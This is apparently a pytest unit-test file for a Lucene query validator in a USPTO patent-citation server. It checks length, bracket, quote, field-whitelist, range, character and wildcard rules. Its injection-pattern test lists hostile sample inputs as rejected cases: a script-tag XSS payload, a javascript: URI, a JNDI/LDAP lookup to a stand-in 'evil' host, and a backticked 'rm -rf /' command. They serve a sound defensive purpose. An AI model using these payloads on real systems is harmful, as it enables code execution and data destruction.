"""Per-helper unit tests for util/query_validator.py.

validate_lucene_syntax is a security boundary (Phase 6A complexity
decomposition, audit §1). This file locks down each `_check_*` helper's
behavior individually, plus a table-driven regression suite for the
composed `validate_lucene_syntax` entry point, so future edits can't
silently change a branch's failure message or which check fires first.
"""

import pytest

from uspto_enriched_citation_mcp.config.constants import (
    MAX_QUERY_LENGTH,
    MAX_QUERY_NESTING_DEPTH,
    MAX_RANGE_QUERIES,
    MAX_WILDCARDS_PER_QUERY,
)
from uspto_enriched_citation_mcp.util.query_validator import (
    OA_VALID_FIELDS,
    VALID_FIELDS,
    _check_balanced_parens_and_brackets,
    _check_balanced_quotes,
    _check_character_set,
    _check_field_whitelist,
    _check_injection_patterns,
    _check_length,
    _check_malformed_boolean_or_range,
    _check_not_empty,
    _check_range_count,
    _check_wildcards,
    validate_lucene_syntax,
)


# ---------------------------------------------------------------------------
# _check_not_empty
# ---------------------------------------------------------------------------
class TestCheckNotEmpty:
    @pytest.mark.parametrize("query", ["", "   ", "\t\n"])
    def test_rejects_empty_or_whitespace(self, query):
        result = _check_not_empty(query)
        assert result == (False, "Query cannot be empty")

    def test_accepts_non_empty(self):
        assert _check_not_empty("techCenter:1600") is None


# ---------------------------------------------------------------------------
# _check_length
# ---------------------------------------------------------------------------
class TestCheckLength:
    def test_rejects_over_max(self):
        query = "A" * (MAX_QUERY_LENGTH + 1)
        result = _check_length(query)
        assert result == (
            False,
            f"Query too long (max {MAX_QUERY_LENGTH} characters)",
        )

    def test_accepts_at_max(self):
        assert _check_length("A" * MAX_QUERY_LENGTH) is None

    def test_accepts_short_query(self):
        assert _check_length("techCenter:1600") is None


# ---------------------------------------------------------------------------
# _check_injection_patterns
# ---------------------------------------------------------------------------
class TestCheckInjectionPatterns:
    @pytest.mark.parametrize(
        "query",
        [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "foo\\x41bar",
            "foo\\u0041bar",
            "${jndi:ldap://evil}",
            "`rm -rf /`",
        ],
    )
    def test_rejects_dangerous_patterns(self, query):
        result = _check_injection_patterns(query)
        assert result == (False, "Query contains potentially dangerous patterns")

    def test_accepts_clean_query(self):
        assert _check_injection_patterns("techCenter:1600") is None


# ---------------------------------------------------------------------------
# _check_balanced_parens_and_brackets
# ---------------------------------------------------------------------------
class TestCheckBalancedParensAndBrackets:
    def test_rejects_unclosed_paren(self):
        result = _check_balanced_parens_and_brackets("(foo")
        assert result == (False, "Unbalanced parentheses")

    def test_rejects_unclosed_bracket(self):
        result = _check_balanced_parens_and_brackets("[foo")
        assert result == (False, "Unbalanced brackets")

    def test_rejects_unopened_close_paren(self):
        result = _check_balanced_parens_and_brackets("foo)")
        assert result == (False, "Unbalanced parentheses or brackets")

    def test_rejects_unopened_close_bracket(self):
        result = _check_balanced_parens_and_brackets("foo]")
        assert result == (False, "Unbalanced parentheses or brackets")

    def test_rejects_excessive_nesting(self):
        query = "(" * (MAX_QUERY_NESTING_DEPTH + 1)
        result = _check_balanced_parens_and_brackets(query)
        assert result == (
            False,
            f"Query nesting too deep (max {MAX_QUERY_NESTING_DEPTH} levels)",
        )

    def test_accepts_balanced(self):
        assert _check_balanced_parens_and_brackets("(techCenter:[1 TO 5])") is None


# ---------------------------------------------------------------------------
# _check_balanced_quotes
# ---------------------------------------------------------------------------
class TestCheckBalancedQuotes:
    def test_rejects_odd_quote_count(self):
        result = _check_balanced_quotes('foo"bar')
        assert result == (False, "Unbalanced quotes")

    def test_accepts_balanced_quotes(self):
        assert _check_balanced_quotes('"foo bar"') is None

    def test_accepts_no_quotes(self):
        assert _check_balanced_quotes("techCenter:1600") is None


# ---------------------------------------------------------------------------
# _check_malformed_boolean_or_range
# ---------------------------------------------------------------------------
class TestCheckMalformedBooleanOrRange:
    def test_rejects_field_with_no_value_end_of_query(self):
        result = _check_malformed_boolean_or_range("techCenter:")
        assert result == (False, "Field queries must have non-empty values")

    def test_rejects_field_with_no_value_before_whitespace(self):
        result = _check_malformed_boolean_or_range("techCenter: foo")
        assert result == (False, "Field queries must have non-empty values")

    def test_rejects_leading_boolean_operator(self):
        result = _check_malformed_boolean_or_range("AND techCenter:1600")
        assert result == (False, "Query cannot start with a boolean operator")

    def test_rejects_trailing_boolean_operator(self):
        result = _check_malformed_boolean_or_range("techCenter:1600 AND")
        assert result == (False, "Incomplete boolean expression")

    def test_rejects_incomplete_range(self):
        result = _check_malformed_boolean_or_range("techCenter:[1 TO")
        assert result == (False, "Incomplete range expression")

    def test_accepts_well_formed_query(self):
        assert (
            _check_malformed_boolean_or_range("techCenter:1600 AND kindCode:B2")
            is None
        )


# ---------------------------------------------------------------------------
# _check_field_whitelist
# ---------------------------------------------------------------------------
class TestCheckFieldWhitelist:
    def test_rejects_unknown_field(self):
        result = _check_field_whitelist("notAField:1600", VALID_FIELDS)
        assert result == (
            False,
            "Invalid field name: notAField. Use get_available_fields tool for valid fields.",
        )

    def test_accepts_whitelisted_field(self):
        assert _check_field_whitelist("techCenter:1600", VALID_FIELDS) is None

    def test_accepts_boolean_operator_as_pseudo_field(self):
        # "AND:" parses as a field reference to "AND", which is allowed
        # because it's in VALID_OPERATORS (not because it's a sane query).
        assert _check_field_whitelist("AND:1600", VALID_FIELDS) is None

    def test_accepts_query_with_no_fields(self):
        assert _check_field_whitelist("just plain text", VALID_FIELDS) is None

    def test_ignores_colons_inside_range_bodies(self):
        # ISO-8601 timestamps in range bounds contain colons — they are
        # values, not field references (live regression, TEST_SUITE.md OA-9:
        # "00:00" was misread as a field named "01T00").
        q = "createDateTime:[2025-01-01T00:00:00Z TO 2025-12-31T23:59:59Z]"
        assert _check_field_whitelist(q, VALID_FIELDS) is None

    def test_ignores_colons_inside_quoted_phrases(self):
        assert (
            _check_field_whitelist('inventorNameText:"Smith: John"', VALID_FIELDS)
            is None
        )

    def test_still_rejects_bad_field_outside_range_and_quotes(self):
        q = 'notAField:1 AND createDateTime:[2025-01-01T00:00:00Z TO *]'
        assert _check_field_whitelist(q, VALID_FIELDS) is not None

    def test_oa_field_set_split(self):
        # OA-only fields pass under OA_VALID_FIELDS, fail under the default
        # enriched whitelist; enriched-only fields fail under OA.
        assert _check_field_whitelist("legalSectionCode:103", OA_VALID_FIELDS) is None
        assert _check_field_whitelist("legalSectionCode:103", VALID_FIELDS) is not None
        assert _check_field_whitelist("citationCategoryCode:X", OA_VALID_FIELDS) is not None


# ---------------------------------------------------------------------------
# _check_range_count
# ---------------------------------------------------------------------------
class TestCheckRangeCount:
    def test_rejects_too_many_ranges(self):
        query = " ".join(
            f"techCenter:[{i} TO {i + 1}]" for i in range(MAX_RANGE_QUERIES + 1)
        )
        result = _check_range_count(query)
        assert result == (False, f"Too many range queries (max {MAX_RANGE_QUERIES})")

    def test_accepts_max_ranges(self):
        query = " ".join(
            f"techCenter:[{i} TO {i + 1}]" for i in range(MAX_RANGE_QUERIES)
        )
        assert _check_range_count(query) is None

    def test_accepts_no_ranges(self):
        assert _check_range_count("techCenter:1600") is None


# ---------------------------------------------------------------------------
# _check_character_set
# ---------------------------------------------------------------------------
class TestCheckCharacterSet:
    @pytest.mark.parametrize(
        "query",
        [
            "techCenter;1600",
            "techCenter:1600#foo",
            "foo@bar",
            "foo%bar",
        ],
    )
    def test_rejects_disallowed_characters(self, query):
        result = _check_character_set(query)
        assert result == (False, "Query contains invalid characters")

    def test_accepts_allowed_characters(self):
        assert (
            _check_character_set('techCenter:[1600-1699] AND "foo bar"? *') is None
        )


# ---------------------------------------------------------------------------
# _check_wildcards
# ---------------------------------------------------------------------------
class TestCheckWildcards:
    def test_rejects_excessive_wildcards(self):
        query = "foo " + "*" * (MAX_WILDCARDS_PER_QUERY + 1)
        result = _check_wildcards(query)
        assert result == (
            False,
            f"Too many wildcards (max {MAX_WILDCARDS_PER_QUERY})",
        )

    def test_rejects_leading_wildcard_at_start(self):
        result = _check_wildcards("*foo")
        assert result == (
            False,
            "Leading wildcards are not allowed (performance issue)",
        )

    def test_rejects_leading_wildcard_mid_query(self):
        result = _check_wildcards("foo *bar")
        assert result == (
            False,
            "Leading wildcards are not allowed (performance issue)",
        )

    def test_accepts_trailing_wildcard(self):
        assert _check_wildcards("foo*") is None

    def test_accepts_wildcard_inside_range(self):
        # "*" bounds inside "[...]" ranges are stripped before the leading
        # wildcard check, so they don't trip the leading-wildcard rule.
        assert _check_wildcards("techCenter:[* TO 1699]") is None


# ---------------------------------------------------------------------------
# validate_lucene_syntax (composed) — table of invalid inputs -> expected
# message, and valid inputs -> pass.
# ---------------------------------------------------------------------------
INVALID_CASES = [
    ("", "Query cannot be empty"),
    ("   ", "Query cannot be empty"),
    ("A" * (MAX_QUERY_LENGTH + 1), f"Query too long (max {MAX_QUERY_LENGTH} characters)"),
    ("<script>alert(1)</script>", "Query contains potentially dangerous patterns"),
    ("techCenter:(unbalanced", "Unbalanced parentheses"),
    ("techCenter:1600)", "Unbalanced parentheses or brackets"),
    ('techCenter:"unbalanced', "Unbalanced quotes"),
    ("techCenter:", "Field queries must have non-empty values"),
    ("AND techCenter:1600", "Query cannot start with a boolean operator"),
    ("techCenter:1600 AND", "Incomplete boolean expression"),
    # Note: an unclosed "[...TO" range is caught earlier by the balanced
    # parens/brackets check ("Unbalanced brackets") in the composed function,
    # since the bracket check runs before the malformed-range check — the
    # "Incomplete range expression" branch is exercised directly on the
    # helper above (test_rejects_incomplete_range).
    ("techCenter:[1600 TO", "Unbalanced brackets"),
    ("notAField:1600", "Invalid field name: notAField. Use get_available_fields tool for valid fields."),
    (
        " ".join(f"techCenter:[{i} TO {i + 1}]" for i in range(MAX_RANGE_QUERIES + 1)),
        f"Too many range queries (max {MAX_RANGE_QUERIES})",
    ),
    ("techCenter;1600", "Query contains invalid characters"),
    (
        "techCenter:1600 " + "*" * (MAX_WILDCARDS_PER_QUERY + 1),
        f"Too many wildcards (max {MAX_WILDCARDS_PER_QUERY})",
    ),
    ("*techCenter:1600", "Leading wildcards are not allowed (performance issue)"),
]

VALID_CASES = [
    "techCenter:1600",
    "techCenter:1600 AND kindCode:B2",
    '"exact phrase"',
    "techCenter:[1600 TO 1699]",
    "foo*",
]


class TestValidateLuceneSyntaxComposed:
    @pytest.mark.parametrize("query,expected_message", INVALID_CASES)
    def test_invalid_queries_rejected_with_message(self, query, expected_message):
        is_valid, message = validate_lucene_syntax(query)
        assert is_valid is False
        assert message == expected_message

    @pytest.mark.parametrize("query", VALID_CASES)
    def test_valid_queries_pass(self, query):
        is_valid, message = validate_lucene_syntax(query)
        assert is_valid is True
        assert message == "Query validation passed"
